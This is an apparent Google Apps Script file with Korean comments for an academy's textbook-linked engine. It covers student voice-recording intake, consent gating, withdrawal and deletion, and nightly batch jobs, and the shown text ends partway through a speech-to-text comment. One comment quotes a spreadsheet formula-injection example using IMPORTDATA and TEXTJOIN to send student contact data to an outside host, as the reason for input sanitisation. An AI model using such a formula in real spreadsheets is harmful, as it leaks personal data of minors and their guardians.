/* ============================================================
 * SYNK 교재연동 엔진 [v9.59] — 목소리 타임랩스(A) + 연습 노트(B) + AI 문법 판정(C)
 *   ⚠ B 는 v9.229 에서 「필살기 노트」→「내 연습 노트」로 개명됐다(유호 확정 08-13 · 카피 전수감사
 *     갈래2-② ⓑ). 시트 열 이름도 `필살기노트`→`연습노트` — 마이그레이션은 setupTextbookLink 안 한 줄.
 *
 * 무엇(2026-07-24 유호님 채택 2건 — 기능 동결의 명시 예외):
 *   A. 목소리 타임랩스 — 교재 권1 1·4·8과 과업의 음성 녹음을 폼으로 제출받아
 *      "처음 목소리 vs 오늘 목소리" 성장 카드를 만든다(시즌1 「첫 목소리」 서사의 물증).
 *   B. 연습 노트 — mastery_log(미도달 문법)·student_errors(강사 약점 메모)·
 *      hw_feedback(AI 첨삭)을 모아 "너의 약점 → 교재 몇 과를 다시 펴라"를 학생별 생성.
 *   C. AI 문법 판정 [v9.59, 유호님 지시 "교사 손 0"] — 학생이 숙제폼으로 낸 문장을
 *      AI가 판정해 mastery_log를 자동 축적. 강사 마감폼 문법태그 없이도 진화 게이트·
 *      연습 노트가 완전 작동한다(마감폼·약점메모폼은 선택 보강으로 강등).
 *      열의 있는 학생일수록 제출↑ → 도달↑ → 진화↑ — 학생 주도 완결 루프.
 *
 * 설계 원칙
 *   ① Glide update 0 — 폼 제출(인바운드)·야간 배치 쓰기만. 앱은 읽기 전용.
 *   ② AI 신규 호출 0 — B는 이미 생성된 첨삭 문구를 재조립한다(비용 증가 없음).
 *   ③ Code.js 무편집 — 상담AI.js 선례(신규 파일 분리). 타파일 전역은 함수 안에서만 읽는다.
 *   ④ 파일 업로드 폼은 Apps Script가 못 만든다(FormApp 미지원) — 폼만 유호님 손(5분),
 *      나머지 연결·미리채움·전개는 전부 스크립트가 한다.
 *
 * 유호님 절차 정본 = docs/교재연동_실행지_v958.md (폼 생성 → app_state 등록 →
 *   voiceFormFinishSetup ▶ → setupTextbookLink ▶ → Glide 열 배치)
 *
 * profiles 신규 열(헤더는 setupTextbookLink가 세팅):
 *   DB 목소리폼URL(학생별 미리채움) · DC 목소리성장카드 · DD 연습노트
 * 신규 시트: voice_log — 열 정본은 VOICE_LOG_HEADERS(v9.107 전사 3열 · [v9.187] 급수 증분 · [v9.208] schema_ver)
 * ============================================================ */

// ── 자체 상수(리터럴만 — 톱레벨 타파일 참조 금지 규칙 준수) ──────────────

// 문법 ID → 교재 위치. 정본 대조 = docs/교재_앱_연동_매핑_v1.md §③ (권2 집필 시 G3xx 잔여 추가)
const TB_GRAMMAR_LESSON = {
  G201: '권1 3과', G202: '권1 2과', G203: '권1 4과', G204: '권1 2과',
  G205: '권1 4과', G206: '권1 3·4과', G207: '권1 7과', G208: '권1 5과',
  G209: '권1 5과', G210: '권1 6과', G211: '권1 6과', G212: '권1 3·4·6과',
  G301: '권1 6과', G305: '권1 7과', G309: '권1 7과', G311: '권1 7과'
};
const TB_VOICE_POINTS = 10;              // 목소리 제출 포인트(하루 1회 자체 가드)
const TB_VOICE_REASON = '목소리제출';     // point_logs 사유(멱등 키)
const TB_NOTE_MAX = 3;                   // 연습 노트 최대 항목 수(인지 부하 상한)
const TB_GROWTH_MIN_DAYS = 21;           // 성장 카드 최소 간격(처음↔최신)
const TB_JUDGE_MAX_PER_RUN = 20;         // C. 문법 판정 — 밤당 최대 학생 수(비용·시간 가드)
const TB_JUDGE_TEXT_CAP = 600;           // 학생당 판정 입력 문장 길이 상한(자)

// profiles 열을 헤더 이름으로 찾는다 — 열 번호 하드코딩 금지(집필 중 54↔106 오계산을 실제로
// 냈던 오류 클래스의 회귀 장치. 다른 세션이 열을 추가·이동해도 이름이 맞으면 안전).
function tbProfileCol_(pf, name) {
  const head = pf.getRange(1, 1, 1, pf.getLastColumn()).getValues()[0];
  for (let i = 0; i < head.length; i++) if (String(head[i]) === name) return i + 1;
  return 0; // 헤더 없음 = setupTextbookLink 미실행 — 쓰지 않고 조용히 대기
}

// ── 유호님 ▶ 1회: 폼 연결 마무리 ─────────────────────────────────────
// 전제: 실행지 STEP 1~2 — 유호님이 폼(학생ID·미션·녹음 파일 3문항)을 만들고
//       app_state에 [목소리폼편집URL | <폼 편집 화면 URL>] 행을 추가한 상태.
function voiceFormFinishSetup() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const st = ensureSheet(ss, 'app_state', ['key', 'value']);
  const url = String(getState(st, '목소리폼편집URL').val || '').trim();
  if (!url) { Logger.log('❌ app_state에 「목소리폼편집URL」 행이 없습니다 — 실행지 STEP 2를 먼저.'); return; }
  const m = url.match(/\/d\/([-\w]+)/);
  if (!m) { Logger.log('❌ URL에서 폼 ID를 찾지 못했습니다. 폼 "편집 화면"의 주소 전체를 붙여넣었는지 확인하세요.'); return; }
  let form;
  try { form = FormApp.openById(m[1]); }
  catch (e) { Logger.log('❌ 폼을 열 수 없습니다(권한/삭제 확인): ' + e); return; }

  // 응답 목적지를 이 시트로(이미 연결돼 있으면 스킵) + 탭 이름 고정
  if (!ss.getSheetByName('목소리폼_응답')) {
    const before = ss.getSheets().map(s => s.getName());
    try { form.setDestination(FormApp.DestinationType.SPREADSHEET, ss.getId()); } catch (e) {}
    linkFormTab_(ss, before, '목소리폼_응답');
  }
  setState(st, '목소리폼ID', form.getId());
  setState(st, '목소리폼URL틀', prefillTemplateOf_(form, '학생ID')); // SIDTOKEN 치환형 — 학생별 원터치
  try { migrateVoiceFormMissionId(); } catch (e) { Logger.log('미션ID 증분 보류: ' + e); } // 새로 연결한 폼도 과업 축을 갖고 시작한다
  Logger.log('✅ 목소리 폼 연결 완료. setupTextbookLink ▶ 실행(1회) 후, 다음 야간 배치부터 profiles DB열에 학생별 링크가 채워집니다.');
  Logger.log('※ 파일 업로드 폼은 학생이 구글 계정 로그인 상태여야 제출됩니다(안드로이드 폰은 대부분 로그인 상태).');
}

/* [v9.190] 🎙 목소리 폼에 「미션ID」 문항을 증분 추가한다 (유호님 승인 2026-08-06 · 멱등).
 *
 * 왜: '미션'이 자유 문자열이라 같은 과제가 여러 표기로 쌓인다. 발음 데이터에 **과업 축**이 없으면
 *   "무엇을 읽었을 때의 발음인지"로 묶을 수가 없고, 그 손실은 소급 복구가 안 된다(학습데이터_스키마감사 잔여 1건).
 *
 * 설계 — migrateHwFormV9138 과 같은 계급이라 같은 세 가지를 지킨다:
 *   ① **선택 응답** — 필수로 만들면 이미 배포된 학생별 프리필 링크(이 문항이 없는)가 전부 제출 불가가 된다.
 *   ② **기존 '목소리폼URL틀'을 건드리지 않는다** — profiles DB열에 이미 뿌려진 학생별 링크가 그대로 살아야 한다.
 *      미션별 링크는 **별도 키** '목소리폼미션틀'로 낸다(숙제폼URL틀 / 숙제폼재작성틀 2키 규약과 동일).
 *   ③ 틀은 **문항이 생긴 뒤에** 뽑는다 — 먼저 뽑으면 프리필 자리가 안 잡힌 틀이 저장된다.
 *
 * 실행: 교재연동Nightly 가 매일 부른다 — **클릭 0회로 자기적용**되고, 폼을 새로 만들어도 다시 치유된다
 *   (유호님 "원격으로 진행" 08-06 · 크롬 브리지가 끊겨 있어 편집기 ▶ 를 쓸 수 없는 상태의 처방이기도 하다).
 *   이미 있으면 조용히 틀만 갱신하고 빈 문자열을 돌려준다 — 매일 같은 메일이 오면 그건 알림이 아니라 소음이다. */
function migrateVoiceFormMissionId() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const st = ensureSheet(ss, 'app_state', ['key', 'value']);
  const fid = String(getState(st, '목소리폼ID').val || '');
  if (!fid) return '';                       // 폼 미연결 — 조용히 대기(다른 기능과 동일한 스위치 원칙)
  let form;
  try { form = FormApp.openById(fid); }
  catch (e) { Logger.log('⚠️ 목소리 폼 접근 실패(권한/삭제 확인): ' + e); return ''; }

  const had = form.getItems().map(x => String(x.getTitle()).trim()).indexOf('미션ID') > -1;
  if (!had) {
    form.addTextItem().setTitle('미션ID').setRequired(false)
      .setHelpText('선생님이 준 링크로 열었다면 자동으로 채워져 있어요 — 비워 두셔도 제출됩니다');
  }
  setState(st, '목소리폼미션틀', prefillTemplate2_(form, '학생ID', '미션ID', 'MISSIONTOKEN'));
  if (had) return '';                        // 이미 있음 — 야간 배치가 매일 부르므로 침묵이 정상이다

  const msg = '🎙 목소리 폼에 「미션ID」 문항을 추가했습니다(선택 응답 — 비워도 제출됩니다).\n'
    + '미션별 링크 틀 = app_state 「목소리폼미션틀」 — SIDTOKEN·MISSIONTOKEN 을 바꿔 쓰면 그 미션 전용 링크가 됩니다.\n'
    + '기존 학생별 링크(profiles 「목소리폼URL」)는 그대로 살아 있습니다.';
  Logger.log(msg);
  adminMail('[SYNK] 🎙 목소리 폼 미션ID 문항 추가', msg);
  return msg;
}

// ── 유호님 ▶ 1회: 시트·열·야간 트리거 설치(멱등) ───────────────────────
function setupTextbookLink() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  ensureSheet(ss, 'voice_log', VOICE_LOG_HEADERS);
  const pf = ss.getSheetByName('profiles');
  if (pf) {
    if (String(pf.getRange('DB1').getValue()) !== '목소리폼URL') pf.getRange('DB1').setValue('목소리폼URL');
    if (String(pf.getRange('DC1').getValue()) !== '목소리성장카드') pf.getRange('DC1').setValue('목소리성장카드');
    /* [v9.229] 개명 — 「필살기노트」 → 「연습노트」(유호 확정 08-13 갈래2-② ⓑ · 카피 전수감사).
     * 구 표기 「내일의 필살기」 계열이 퇴역했고 이 열 이름이 그 계열의 마지막 라이브 자리였다.
     * 🔑 이 한 줄이 마이그레이션이다 — 옛 이름이든 빈 칸이든 새 이름으로 덮는다. 열의 «값»은
     *   건드리지 않는다(다음 일요일 밤 buildFocusNotes_ 가 새 제목으로 다시 쓴다). */
    if (String(pf.getRange('DD1').getValue()) !== '연습노트') pf.getRange('DD1').setValue('연습노트');
  }
  // 야간 트리거(23:00) — 같은 함수의 기존 트리거는 제거 후 재설치(멱등)
  ScriptApp.getProjectTriggers().forEach(t => {
    if (t.getHandlerFunction() === '교재연동Nightly') ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger('교재연동Nightly').timeBased().everyDays(1).atHour(23).create();
  Logger.log('✅ 교재연동 설치 완료 — 매일 23시: 목소리 스윕+링크, 일요일 밤: 연습 노트 생성.');
  교재연동Nightly(); // 설치 직후 1회 즉시(링크 열을 바로 채워 Glide 조립을 기다리게 하지 않는다)
}

// ── 야간 오케스트레이터(트리거 23:00 — aiFeedbackBatch_ 22시 뒤라 당일 첨삭분 판정 가능) ──
function 교재연동Nightly() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  try { masteryFromFeedback_(ss); } catch (e) { Logger.log('masteryFromFeedback_ 오류: ' + e); }
  // [v9.190] 폼 문항 자기적용 — **스위프보다 앞**이어야 그날 응답부터 미션ID 열을 읽는다(멱등·이미 있으면 침묵)
  try { migrateVoiceFormMissionId(); } catch (e) { Logger.log('migrateVoiceFormMissionId 오류: ' + e); }
  try { voiceSweep_(ss); } catch (e) { Logger.log('voiceSweep_ 오류: ' + e); }
  try { voiceTranscribe_(ss); } catch (e) { Logger.log('voiceTranscribe_ 오류: ' + e); } // [v9.107] 적재 직후 전사 — 성장 카드가 전사문을 실을 수 있게 카드 생성보다 앞
  try { writeVoiceLinks_(ss); } catch (e) { Logger.log('writeVoiceLinks_ 오류: ' + e); }
  try { buildVoiceGrowthCards_(ss); } catch (e) { Logger.log('buildVoiceGrowthCards_ 오류: ' + e); }
  // 연습 노트는 주 1회(일요일 밤)면 충분 — 매일 바뀌면 "노트"가 아니라 소음이 된다
  if (new Date().getDay() === 0) {
    try { buildFocusNotes_(ss); } catch (e) { Logger.log('buildFocusNotes_ 오류: ' + e); }
  }
}

// ── A-1. 폼 응답 → voice_log 전개(+포인트, 파일 공유 전환) ──────────────
function voiceSweep_(ss) {
  const src = ss.getSheetByName('목소리폼_응답');
  if (!src || src.getLastRow() < 2) return;
  const props = PropertiesService.getScriptProperties();
  const last = src.getLastRow();
  const from = Number(props.getProperty('목소리폼_포인터')) || 1;
  if (from >= last) { if (from > last) props.setProperty('목소리폼_포인터', String(last)); return; }
  const tz = ss.getSpreadsheetTimeZone();

  // 응답 열 위치는 헤더로 찾는다(문항 순서를 유호님이 바꿔도 안전)
  const head = src.getRange(1, 1, 1, src.getLastColumn()).getValues()[0].map(h => String(h || ''));
  const cSid = head.findIndex(h => h.indexOf('학생ID') > -1);
  /* [v9.190] ⚠ '미션ID'는 '미션'을 부분문자열로 품는다 — 먼저 집고, '미션'은 **그 열을 뺀 뒤** 찾는다.
   *   순서를 안 가르면 폼 문항 순서가 바뀌는 순간 ID가 자유문자열 칸에 실린다(예외 없이 조용한 오적재). */
  const cMissionId = head.findIndex(h => h.replace(/\s/g, '').indexOf('미션ID') > -1);
  const cMission = head.findIndex((h, i) => i !== cMissionId && h.indexOf('미션') > -1);
  const cFile = head.findIndex(h => h.indexOf('녹음') > -1 || h.indexOf('파일') > -1);
  if (cSid < 0 || cFile < 0) { Logger.log('voiceSweep_: 응답 탭에서 학생ID/녹음 열을 못 찾음 — 폼 문항 제목 확인'); return; }

  // [v9.187] 폭 67 — 급수(BO67) 스냅샷 재료(첨삭·대화·퀴즈와 같은 위치 규약 r[66]).
  //   새 응답이 있을 때만 여기 온다(위 포인터 조기 반환) — 야간 1회라 비용 무시 가능.
  const valid = new Set(), lvOf = {};
  const pf = ss.getSheetByName('profiles');
  if (pf && pf.getLastRow() >= 2) pf.getRange(2, 1, pf.getLastRow() - 1, 67).getValues().forEach(r => {
    if (r[0] && r[3] === 'student') { const k = String(r[0]).trim(); valid.add(k); lvOf[k] = Number(r[66]) || 0; }
  });

  const vl = ensureSheet(ss, 'voice_log', VOICE_LOG_HEADERS);
  헤더보정_(vl, VOICE_LOG_HEADERS); // [v9.187] 이미 서 있는 9열 시트에 급수 이름표(엔진_수집.js 공용 치유 — 런타임 호출이라 로드 순서 무관)
  const pl = ensureSheet(ss, 'point_logs', ['id', 'student_id', 'points', 'reason', 'given_by', 'created_at', 'month', '태그']);
  // 멱등: 이미 지급된 '날짜|sid' (지급→포인터 저장 사이 크래시 재시도 대비)
  const givenKey = {};
  if (pl.getLastRow() >= 2) pl.getRange(2, 1, pl.getLastRow() - 1, 6).getValues().forEach(r => {
    if (r[1] && String(r[3] || '') === TB_VOICE_REASON && r[5]) givenKey[dstr(r[5], tz) + '|' + String(r[1]).trim()] = 1;
  });

  /* [v9.104] 🔒 음성 동의 게이트 — v9.90이 '음성동의' 열을 만들며 "후속 녹음 기능이 기계 게이트로 쓴다"고
   *   선언했는데 정작 이 스위프에는 배선이 없었다(08-01 발견). 동의하지 않은 학생의 녹음이 voice_log에
   *   쌓이고 포인트까지 지급되던 상태였고, 보관이 무기한이 되면서 그 비용이 "영구 보관"으로 커진다.
   *   맵이 null(시트·열 접근 실패)이면 **전원 보류** — 판정 불가를 통과로 바꾸면 게이트가 침묵으로 열린다.
   *   보류분은 적재도, 공유 전환도, 포인트도 하지 않고 원장에게만 알린다. 파일 자동 삭제는 하지 않는다
   *   (오판이면 복구가 불가능하고, 종이 동의서 학생일 수도 있다 — 사람이 판단할 몫). */
  const consent = (typeof voiceConsentMap_ === 'function') ? voiceConsentMap_() : null;
  const rows = src.getRange(from + 1, 1, last - from, src.getLastColumn()).getValues();
  const vOut = [], pOut = [], badSid = [], held = []; // [v9.67] 무효 sid · [v9.104] 미동의 보류
  rows.forEach(r => {
    const ts = r[0] instanceof Date ? r[0] : new Date();
    const sid = String(r[cSid] || '').trim();
    if (!sid) return;
    if (!valid.has(sid)) { badSid.push(sid); return; } // 통보만(Code.js notifyDroppedSids_ — 하루 1회 dedup)
    const state = consent ? (consent[sid] || '') : null;
    if (state !== 'yes') { held.push(sid + ' (' + (state === 'no' ? '거부' : state === '' ? '미응답' : '동의 확인 불가') + ')'); return; }
    const fileUrl = String(r[cFile] || '').trim();
    if (!fileUrl) return;
    const mission = cMission >= 0 ? String(r[cMission] || '').trim() : '';
    const fid = (fileUrl.match(/[?&]id=([-\w]+)/) || fileUrl.match(/\/d\/([-\w]+)/) || [])[1] || '';
    /* [v9.155] 🔒 공개 전환을 **하지 않는다**(유호님 08-04 「B로 가자」 결정 · 근거 = docs/개인정보처리방침_초안_v1.md §0-B).
     *   구 설계는 앱 재생을 위해 학생 녹음을 ANYONE_WITH_LINK로 열었다. 그런데 이 파일은 **미성년의 목소리**이고
     *   코드 스스로 「몽골법상 생체정보 계열로 읽힐 수 있다」고 적어 뒀다(엔진_폼리포트.js VOICE_RETENTION_MONTHS 주석).
     *   보관이 무기한이라 공개도 무기한이 되고, Drive 공개 링크에는 만료가 없어 한 번 새면 영구다.
     *   ▣ 대체 경로는 이미 있다 — **전사문**(v9.107). 그때 코드가 적은 판단이 그대로 근거가 된다:
     *     「링크는 눌러야 비교되고, 두 파일을 번갈아 듣는 사람은 거의 없다. 전사문이 있으면 눈으로 한 번에 대비된다.」
     *     즉 성장 카드의 값은 재생이 아니라 대비였고, 그 값은 링크 없이도 그대로 산다(buildVoiceGrowthCards_ 참조).
     *   ▣ 원본은 지우지 않는다 — 학원 내부 자산(피드백·AI 학습)이고 동의 범위 안이다. 다만 **밖에서 열리지 않는다.** */
    // [v9.187] 전사 3칸은 빈칸으로 두고(야간 STT가 채운다) 맨 끝에 급수 스냅샷 — 헤더 정본과 같은 폭으로 쓴다
    // [v9.190] 미션ID는 프리필 링크로만 들어온다 — 학생이 손으로 채우는 칸이 아니라 비어도 정상이다
    vOut.push([sid, ts, mission, fileUrl, fid, new Date(), '', '', '', lvOf[sid] || 0,
      cMissionId >= 0 ? String(r[cMissionId] || '').trim() : '',
      SCHEMA_VER]); // [v9.208] 행이 자기 규격을 들고 있게(A-8) — 정의는 엔진_수집.js 하나(사본 금지 · 함수 안 참조라 파일 로드 순서 무관)
    const key = dstr(ts, tz) + '|' + sid;
    if (!givenKey[key]) { // 하루 1회만 지급(여러 번 제출해도 기록은 전부, 포인트는 1회)
      givenKey[key] = 1;
      pOut.push(['VC' + Utilities.formatDate(ts, tz, 'yyyyMMdd') + '-' + sid, sid, TB_VOICE_POINTS,
        TB_VOICE_REASON, '시스템', ts, Utilities.formatDate(ts, tz, 'yyyy-MM'), '']);
    }
  });
  /* [v9.159] 🛡 수식 인젝션 소독 — [v9.157]이 폼 직기입 7경로를 공용 통로로 막을 때 **이 함수만 남았다**
   *   (하드닝 세션이 발견·인계 · 보드상 이 구역 편집권이 이 세션이라 넘어왔다).
   *   위험의 실체: `mission`은 목소리 폼의 **학생·강사 손입력 문자열**이고, voice_log·point_logs는
   *   `profiles`(학생·보호자 연락처)와 **같은 스프레드시트**다. `=`로 시작하면 시트가 스스로 평가해
   *   `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!H2:H400))` 한 줄로 개인정보가 밖으로 나간다(클릭 불요).
   *   pOut은 지금은 상수뿐이지만 함께 통과시킨다 — **같은 방어를 자리마다 판단해 얹으면 다음 자리가 빠진다.**
   *   `행소독_`(Code.js)은 문자열만 소독하고 Date·number는 타입 보존한다(ts·포인트 숫자 안전). */
  if (vOut.length) vl.getRange(vl.getLastRow() + 1, 1, vOut.length, VOICE_LOG_HEADERS.length).setValues(행소독_(vOut));
  if (pOut.length) pl.getRange(pl.getLastRow() + 1, 1, pOut.length, 8).setValues(행소독_(pOut));
  notifyDroppedSids_('목소리폼', badSid); // [v9.67] 함수 안 런타임 호출 — 톱레벨 크로스파일 금지 규칙과 무관
  props.setProperty('목소리폼_포인터', String(last));
  if (vOut.length) adminMail('[SYNK] 🎙 새 목소리 ' + vOut.length + '건',
    '목소리 미션 제출 ' + vOut.length + '건이 voice_log에 쌓였습니다. 성장 카드는 야간 배치가 자동 갱신합니다.');
  // [v9.104] 미동의 보류 통지 — 침묵하면 "왜 내 제출이 반영 안 되지"가 학생 쪽 미스터리가 된다
  if (held.length) adminMail('[SYNK] 🔒 음성 동의 없는 제출 ' + held.length + '건 — 보류',
    '아래 제출은 「음성동의」가 확인되지 않아 voice_log에 넣지 않았고 포인트도 지급하지 않았습니다.\n' +
    '(파일은 자동 삭제하지 않았습니다 — 종이 동의서 학생일 수 있어 사람 판단 몫입니다.)\n\n' +
    held.join('\n') + '\n\n' +
    '처리: ①동의를 받은 학생이면 상담시트 「음성동의」 칸에 「네, 동의합니다」를 넣고 재제출을 안내하세요.\n' +
    '②거부한 학생이면 드라이브의 해당 녹음 파일을 삭제하세요.\n' +
    (consent ? '' : '⚠ 상담시트·음성동의 열을 읽지 못해 전원을 보류했습니다 — migrateConsentV186 ▶ 로 열을 먼저 만드세요.'));
}

// ── A-2. 학생별 미리채움 링크 → profiles '목소리폼URL' 열 ─────────────────
function writeVoiceLinks_(ss) {
  const st = ss.getSheetByName('app_state');
  if (!st) return;
  const tmpl = String(getState(st, '목소리폼URL틀').val || '');
  if (!tmpl) return; // 폼 미연결 — 조용히 대기(다른 기능과 동일한 스위치 원칙)
  const pf = ss.getSheetByName('profiles');
  if (!pf || pf.getLastRow() < 2) return;
  const n = pf.getLastRow() - 1;
  const ids = pf.getRange(2, 1, n, 4).getValues();
  const out = ids.map(r => [(r[0] && r[3] === 'student') ? tmpl.replace(/SIDTOKEN/g, encodeURIComponent(String(r[0]).trim())) : '']);
  const col = tbProfileCol_(pf, '목소리폼URL');
  if (col) writeIfChanged(pf, 2, col, out);
}

/* ── A-2b. [v9.105] 🗑 음성 동의 철회 실행 — 무기한 보관의 **유일한 삭제 트리거** ──────────
 * v9.104가 보관을 무기한으로 바꾸면서 시간 기반 자동 삭제가 사라졌다. 그러면 동의서의
 * "철회하시면 보관 중인 녹음을 모두 삭제합니다"가 **코드로 실행할 수단이 없는 약속**이 된다
 * — 문장이 참이 되려면 지울 수 있어야 한다. 지워야 할 곳은 세 군데다:
 *   ① Drive 원본 파일  ② voice_log 행  ③ profiles 목소리성장카드(첫 목소리 URL이 박혀 있다)
 * 여기에 ④ 상담시트 음성동의를 '아니요'로 되돌려 **다음 제출이 자동 보류**되게 한다
 * (안 되돌리면 지운 그날 밤 스위프가 새 녹음을 다시 적재한다).
 *
 * ⚠ 비가역이므로 **미리보기가 기본**이다. voiceWithdraw('SYNK-001')은 무엇이 지워질지만 보여주고,
 *   실제 실행은 voiceWithdraw('SYNK-001', true). Drive는 완전 삭제가 아니라 휴지통으로 보낸다
 *   (30일 복구 창 — 오판을 되돌릴 수 있고, 30일 뒤 자동 영구 삭제라 약속에도 어긋나지 않는다). */
function voiceWithdraw(studentId, confirm) {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const sid = String(studentId || '').trim();
  if (!sid) {
    const usage = '사용법: voiceWithdraw("학생ID") → 무엇이 지워질지 미리보기\n' +
      '        voiceWithdraw("학생ID", true) → 실제 삭제(Drive는 휴지통 30일 보관)';
    Logger.log(usage); return usage;
  }
  const vl = ss.getSheetByName('voice_log');
  const rows = (vl && vl.getLastRow() >= 2) ? vl.getRange(2, 1, vl.getLastRow() - 1, 6).getValues() : [];
  const mine = [];
  rows.forEach((r, i) => { if (String(r[0] || '').trim() === sid) mine.push({ row: i + 2, date: r[1], mission: r[2], url: r[3], fid: String(r[4] || '') }); });

  const head = ['🗑 음성 동의 철회 — ' + sid + (confirm === true ? ' (실행)' : ' (미리보기)'),
    '녹음 기록: ' + mine.length + '건'];
  mine.slice(0, 10).forEach(m => head.push('  · ' + (m.date instanceof Date ? Utilities.formatDate(m.date, ss.getSpreadsheetTimeZone(), 'yyyy-MM-dd') : String(m.date)) + ' ' + (m.mission || '')));
  if (mine.length > 10) head.push('  … 외 ' + (mine.length - 10) + '건');

  if (confirm !== true) {
    head.push('', '지울 곳: ①Drive 파일 ' + mine.filter(m => m.fid).length + '개(휴지통) ②voice_log ' + mine.length + '행 ③목소리성장카드 ④상담시트 음성동의 → 「아니요」',
      '', '실제로 지우려면: voiceWithdraw("' + sid + '", true)');
    Logger.log(head.join('\n')); return head.join('\n');
  }

  // [v9.125] 실행 순서 재편: ④동의 되돌리기를 **맨 앞**으로 — 뒤 단계가 예외로 죽어도 재유입(그날 밤 스위프의
  //   재적재)만은 반드시 차단된다. 구 순서(①②③④)는 ③이 던지면 ④가 안 돌아 철회가 조용히 무효화됐다.
  // ④→① 동의를 '아니요'로
  let consentSet = '실패(수기 확인 필요)';
  try {
    const consult = SpreadsheetApp.openById(CONSULT_SHEET_ID).getSheetByName('상담데이터입력');
    const w = consult.getLastColumn();
    const hdr = consult.getRange(2, 1, 1, w).getValues()[0].map(h => String(h || '').trim());
    const ci = hdr.indexOf(CONSENT_EXT_HEADERS[0]), si = hdr.indexOf('학생ID');
    if (ci > -1 && si > -1) {
      const body = consult.getRange(3, 1, consult.getLastRow() - 2, w).getValues();
      let hit = 0;
      body.forEach((r, i) => {
        if (String(r[si] || '').trim() !== sid) return;
        consult.getRange(i + 3, ci + 1).setValue('아니요, 원하지 않습니다'); hit++;
      });
      consentSet = hit ? hit + '행 「아니요」로 변경' : '해당 학생 행 없음(수기 확인)';
    }
  } catch (e) { Logger.log('동의 되돌리기 실패: ' + e); }
  // ② Drive 휴지통 — 실패해도 나머지는 진행한다(파일이 이미 없을 수 있다)
  let trashed = 0, failed = 0;
  mine.forEach(m => {
    if (!m.fid) return;
    try { DriveApp.getFileById(m.fid).setTrashed(true); trashed++; }
    catch (e) { failed++; Logger.log('파일 휴지통 실패(' + m.fid + '): ' + e); }
  });
  // ③ voice_log 행 삭제 — 아래에서 위로 지워야 인덱스가 밀리지 않는다
  mine.map(m => m.row).sort((a, b) => b - a).forEach(r => vl.deleteRow(r));
  /* [v9.241] **의도한 축소이므로 기준선도 내린다** — 안 그러면 주간 워치독이 다음 주부터
   *   「수집 장부가 줄었다」를 매주 외친다. 우리가 시킨 삭제라 따를 처방이 없는 경보다(F103).
   *   데모 퇴장(`wipe`)과 같은 규칙을 이 통로에도 적는다 — 수집 탭에서 **행을 지우는 자리**는
   *   여기와 거기 둘뿐이고, 둘 다 그 자리에서 내린다(①배포 검수 P2 · 723c1d0137a4). */
  if (mine.length) 탭수축기준선지움_('voice_log');
  // ④ 성장 카드 비우기 — 첫 목소리 URL이 카드 HTML에 박혀 있어 지우지 않으면 링크가 남는다.
  //    [v9.125] 헤더만 있는 profiles(getLastRow()=1) 가드 — getRange(2,1,0,1) 예외가 뒤 단계를 죽이던 구멍
  const pf = ss.getSheetByName('profiles');
  const col = pf ? tbProfileCol_(pf, '목소리성장카드') : 0;
  if (pf && col && pf.getLastRow() >= 2) {
    const ids = pf.getRange(2, 1, pf.getLastRow() - 1, 1).getValues();
    ids.forEach((r, i) => { if (String(r[0] || '').trim() === sid) pf.getRange(i + 2, col).clearContent(); });
  }

  head.push('', '✅ Drive 휴지통 ' + trashed + '개' + (failed ? ' (실패 ' + failed + ')' : '') +
    ' · voice_log ' + mine.length + '행 삭제 · 성장 카드 초기화 · 동의: ' + consentSet,
    'ⓘ Drive 휴지통은 30일 뒤 자동 영구 삭제됩니다(그 전엔 복구 가능).');
  const msg = head.join('\n');
  Logger.log(msg);
  adminMail('[SYNK] 🗑 음성 동의 철회 처리 — ' + sid, msg);
  return msg;
}

/* [v9.125] 🗑 철회 무인자 진입점 — voiceWithdraw는 인자 2개라 편집기 ▶·시트 메뉴에서 실행할 수 없어,
 * 「철회 약속」이 비개발자 운영에선 코드 편집 없이는 이행 불가였다(v9.105가 고치려던 결함의 실행 계층 재현).
 * UI 프롬프트 2단계: ①학생ID 입력 → 미리보기 표시 ②확인 문구 「삭제」 입력 시에만 실행. */
function voiceWithdrawPrompt() {
  const ui = SpreadsheetApp.getUi();
  const a = ui.prompt('🗑 음성 동의 철회', '철회할 학생ID를 입력하세요 (예: SYNK-001)', ui.ButtonSet.OK_CANCEL);
  if (a.getSelectedButton() !== ui.Button.OK) return;
  const sid = String(a.getResponseText() || '').trim();
  if (!sid) { ui.alert('학생ID가 비어 있습니다.'); return; }
  const preview = voiceWithdraw(sid);
  const b = ui.prompt('미리보기 — 아래 내용을 확인하세요', preview + '\n\n실제로 삭제하려면 「삭제」라고 입력하세요.', ui.ButtonSet.OK_CANCEL);
  if (b.getSelectedButton() !== ui.Button.OK || String(b.getResponseText() || '').trim() !== '삭제') {
    ui.alert('취소했습니다 — 아무것도 지워지지 않았습니다.'); return;
  }
  ui.alert(voiceWithdraw(sid, true));
}

/* ═══════════ [v9.107] 🎧 STT — GCP Speech-to-Text 전사 (유호님 08-01 결정) ═══════════
 * 녹음 AI 첨삭의 마지막 빠진 조각. Claude API는 오디오를 받지 않으므로 음성→텍스트가 먼저 필요하다.
 *
 * ▣ 왜 서비스 계정인가 (매니페스트를 건드리지 않는 유일한 길)
 *   Speech-to-Text는 `cloud-platform` 스코프 토큰을 요구한다. `ScriptApp.getOAuthToken()`으로 그걸
 *   받으려면 appsscript.json에 oauthScopes를 명시해야 하는데, **그 순간 자동 추론이 꺼진다** —
 *   현재 이 프로젝트는 스코프를 한 줄도 적지 않고 추론에 맡기고 있어(SpreadsheetApp·DriveApp·FormApp·
 *   DocumentApp·MailApp·ScriptApp·UrlFetchApp·Session) 하나라도 빠뜨리면 트리거 10개가 한 번에 죽는다.
 *   서비스 계정 JWT는 UrlFetchApp만 쓰므로(이미 있는 권한) **라이브 리스크가 0**이다.
 *   ⓘ 나중에 매니페스트 스코프를 정리하기로 하면 그때 getOAuthToken 경로로 바꿔도 된다(아래 폴백 유지).
 *
 * ▣ 알려진 제약 — 지어내지 않고 실패를 그대로 기록한다
 *   ① 동기 recognize는 짧은 오디오용이다(대략 1분). 초과분은 API가 거부하고, 그 사유를 상태 열에 남긴다.
 *   ② 인라인 base64라 요청 크기 한도가 있다 — 10MB 넘는 파일은 보내기 전에 거른다.
